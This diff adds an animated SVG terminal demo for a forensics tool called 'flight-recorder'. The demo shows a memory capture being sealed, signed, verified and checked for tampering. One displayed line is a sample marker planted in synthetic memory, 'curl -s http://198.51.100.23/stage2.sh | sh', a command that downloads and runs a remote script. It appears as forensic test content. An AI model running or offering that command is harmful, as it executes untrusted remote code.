@@ -1,0 +1,77 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 780 606" width="780" height="606" role="img" aria-label="flight-recorder demo: the evidence pipeline sealing, signing and verifying a capture, then detecting tampering">
+<title>flight-recorder demo</title>
+<style>
+  text { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, "Liberation Mono", monospace; font-size: 13.5px; white-space: pre; }
+  .l0 { animation: r0 9s infinite; }
+  @keyframes r0 { 0%,0.010% { opacity: 0 } 1.210%,100% { opacity: 1 } }
+  .l1 { animation: r1 9s infinite; }
+  @keyframes r1 { 0%,2.444% { opacity: 0 } 3.644%,100% { opacity: 1 } }
+  .l2 { animation: r2 9s infinite; }
+  @keyframes r2 { 0%,4.889% { opacity: 0 } 6.089%,100% { opacity: 1 } }
+  .l3 { animation: r3 9s infinite; }
+  @keyframes r3 { 0%,7.333% { opacity: 0 } 8.533%,100% { opacity: 1 } }
+  .l4 { animation: r4 9s infinite; }
+  @keyframes r4 { 0%,9.778% { opacity: 0 } 10.978%,100% { opacity: 1 } }
+  .l5 { animation: r5 9s infinite; }
+  @keyframes r5 { 0%,12.222% { opacity: 0 } 13.422%,100% { opacity: 1 } }
+  .l6 { animation: r6 9s infinite; }
+  @keyframes r6 { 0%,14.667% { opacity: 0 } 15.867%,100% { opacity: 1 } }
+  .l7 { animation: r7 9s infinite; }
+  @keyframes r7 { 0%,17.111% { opacity: 0 } 18.311%,100% { opacity: 1 } }
+  .l8 { animation: r8 9s infinite; }
+  @keyframes r8 { 0%,19.556% { opacity: 0 } 20.756%,100% { opacity: 1 } }
+  .l9 { animation: r9 9s infinite; }
+  @keyframes r9 { 0%,22.000% { opacity: 0 } 23.200%,100% { opacity: 1 } }
+  .l10 { animation: r10 9s infinite; }
+  @keyframes r10 { 0%,24.444% { opacity: 0 } 25.644%,100% { opacity: 1 } }
+  .l11 { animation: r11 9s infinite; }
+  @keyframes r11 { 0%,26.889% { opacity: 0 } 28.089%,100% { opacity: 1 } }
+  .l12 { animation: r12 9s infinite; }
+  @keyframes r12 { 0%,29.333% { opacity: 0 } 30.533%,100% { opacity: 1 } }
+  .l13 { animation: r13 9s infinite; }
+  @keyframes r13 { 0%,31.778% { opacity: 0 } 32.978%,100% { opacity: 1 } }
+  .l14 { animation: r14 9s infinite; }
+  @keyframes r14 { 0%,34.222% { opacity: 0 } 35.422%,100% { opacity: 1 } }
+  .l15 { animation: r15 9s infinite; }
+  @keyframes r15 { 0%,36.667% { opacity: 0 } 37.867%,100% { opacity: 1 } }
+  .l16 { animation: r16 9s infinite; }
+  @keyframes r16 { 0%,39.111% { opacity: 0 } 40.311%,100% { opacity: 1 } }
+  .l17 { animation: r17 9s infinite; }
+  @keyframes r17 { 0%,41.556% { opacity: 0 } 42.756%,100% { opacity: 1 } }
+  .l18 { animation: r18 9s infinite; }
+  @keyframes r18 { 0%,44.000% { opacity: 0 } 45.200%,100% { opacity: 1 } }
+  .l19 { animation: r19 9s infinite; }
+  @keyframes r19 { 0%,46.444% { opacity: 0 } 47.644%,100% { opacity: 1 } }
+  .l20 { animation: r20 9s infinite; }
+  @keyframes r20 { 0%,48.889% { opacity: 0 } 50.089%,100% { opacity: 1 } }
+  .l21 { animation: r21 9s infinite; }
+  @keyframes r21 { 0%,51.333% { opacity: 0 } 52.533%,100% { opacity: 1 } }
+  .cursor { animation: blink 1.05s steps(1) infinite; }
+  @keyframes blink { 0%,50% { opacity: 1 } 50.01%,100% { opacity: 0 } }
+</style>
+<rect width="780" height="606" rx="10" fill="#0d1117"/>
+<rect width="780" height="38" rx="10" fill="#161b22"/>
+<rect y="28" width="780" height="10" fill="#161b22"/>
+<circle cx="24" cy="19" r="6" fill="#ff5f56"/>
+<circle cx="44" cy="19" r="6" fill="#ffbd2e"/>
+<circle cx="64" cy="19" r="6" fill="#27c93f"/>
+<text x="240" y="24" fill="#8b949e" font-size="12">flight-recorder — no kernel, no root, no cluster</text>
+<text class="l0" y="56"><tspan x="26.0" fill="#8b949e">$ </tspan><tspan x="42.2" fill="#58a6ff">flight-recorder demo</tspan></text>
+<text class="l2" y="100"><tspan x="26.0" fill="#8b949e">  [1] </tspan><tspan x="74.6" fill="#c9d1d9">signing key           </tspan><tspan x="252.8" fill="#8b949e">./demo/demo-key.pem (generated) key id 67f3672c0b3057d6</tspan></text>
+<text class="l3" y="122"><tspan x="26.0" fill="#8b949e">  [2] </tspan><tspan x="74.6" fill="#c9d1d9">synthetic acquisition </tspan><tspan x="252.8" fill="#8b949e">262144 bytes across 2 regions, outcome complete</tspan></text>
+<text class="l4" y="144"><tspan x="26.0" fill="#8b949e">  [3] </tspan><tspan x="74.6" fill="#c9d1d9">merkle seal           </tspan><tspan x="252.8" fill="#8b949e">root c60318963689c015e04659f307f71fb8... (64 leaves, depth 7)</tspan></text>
+<text class="l5" y="166"><tspan x="26.0" fill="#8b949e">  [4] </tspan><tspan x="74.6" fill="#c9d1d9">ecdsa signature       </tspan><tspan x="252.8" fill="#8b949e">ecdsa-p256-sha256-asn1 over the root</tspan></text>
+<text class="l6" y="188"><tspan x="26.0" fill="#8b949e">  [5] </tspan><tspan x="74.6" fill="#c9d1d9">CASE/UCO bundle       </tspan><tspan x="252.8" fill="#8b949e">14 objects, digest 1a3f0f42c978749d</tspan></text>
+<text class="l7" y="210"><tspan x="26.0" fill="#8b949e">  [6] </tspan><tspan x="74.6" fill="#c9d1d9">evidence bundle       </tspan><tspan x="252.8" fill="#8b949e">./demo/evidence/6b3f8dbe-0575-4b2d-937c-978a24a09430</tspan></text>
+<text class="l8" y="232"><tspan x="26.0" fill="#8b949e">  [7] </tspan><tspan x="74.6" fill="#c9d1d9">verification          </tspan><tspan x="252.8" fill="#3fb950">VERIFIED</tspan><tspan x="317.6" fill="#8b949e">  merkle root c60318963689c015...</tspan></text>
+<text class="l9" y="254"><tspan x="26.0" fill="#8b949e">  [8] </tspan><tspan x="74.6" fill="#c9d1d9">tamper detection      </tspan><tspan x="252.8" fill="#8b949e">flipped one byte -&gt; verification correctly </tspan><tspan x="601.1" fill="#f85149">FAILED</tspan></text>
+<text class="l11" y="298"><tspan x="26.0" fill="#8b949e">marker planted in synthetic memory:</tspan></text>
+<text class="l12" y="320"><tspan x="26.0" fill="#d29922">  "curl -s http://198.51.100.23/stage2.sh | sh"</tspan></text>
+<text class="l14" y="364"><tspan x="26.0" fill="#8b949e">$ </tspan><tspan x="42.2" fill="#58a6ff">flight-recorder verify --bundle ./evidence/6b3f8dbe --key pub.pem</tspan></text>
+<text class="l16" y="408"><tspan x="26.0" fill="#3fb950">  [ OK ] </tspan><tspan x="98.9" fill="#c9d1d9">manifest file digests   5 file(s)</tspan></text>
+<text class="l17" y="430"><tspan x="26.0" fill="#3fb950">  [ OK ] </tspan><tspan x="98.9" fill="#c9d1d9">ecdsa signature</tspan></text>
+<text class="l18" y="452"><tspan x="26.0" fill="#3fb950">  [ OK ] </tspan><tspan x="98.9" fill="#c9d1d9">merkle root             c60318963689c015e04659f307f71fb8f991b97d...</tspan></text>
+<text class="l19" y="474"><tspan x="26.0" fill="#3fb950">  [ OK ] </tspan><tspan x="98.9" fill="#c9d1d9">CASE/UCO structure</tspan></text>
+<text class="l21" y="518"><tspan x="26.0" fill="#3fb950">VERIFIED</tspan><tspan x="90.8" fill="#bc8cff">  6b3f8dbe-0575-4b2d-937c-978a24a09430</tspan></text>
+<rect class="cursor" x="26" y="528" width="8.1" height="15" fill="#3fb950"/>
+</svg>
